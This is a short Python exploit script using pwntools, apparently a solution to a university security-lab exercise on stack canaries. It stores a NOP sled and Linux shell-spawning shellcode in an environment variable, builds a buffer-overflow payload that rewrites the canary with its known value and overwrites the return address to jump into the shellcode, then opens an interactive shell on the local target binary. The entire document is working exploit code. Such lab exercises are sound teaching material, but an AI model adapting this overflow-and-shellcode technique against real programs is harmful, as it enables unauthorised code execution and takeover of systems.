from pwn import *

context.terminal = ["tmux", "split-window", "-h"]

env = {
    "SHELLCODE": b"\x90" * 0x1000 + asm(shellcraft.i386.linux.sh())
}
# p = gdb.debug(["./target"], env=env)
p = process(["/home/lab06/tut06-1-ssp/target"], env=env)

# payload (fake stack frame to be injected)
#  0xffffce00 [   buf    ] AAAAAAAAAAAA
#  0xffffce10 [  canary  ] 0xfacecafe
#  0xffffce14 [  dummy?  ]
#  0xffffce18 [   ebp    ]
#  0xffffce1c [  retaddr ] -> shellcode_address

addr_shellcode = 0xffffd74b

payload = cyclic(16)
payload += p32(0xfacecafe)
payload += p32(0xdeadbeef)
payload += p32(0xdeadbeef) # ebp
payload += p32(addr_shellcode)

p.sendline(payload)
p.interactive()
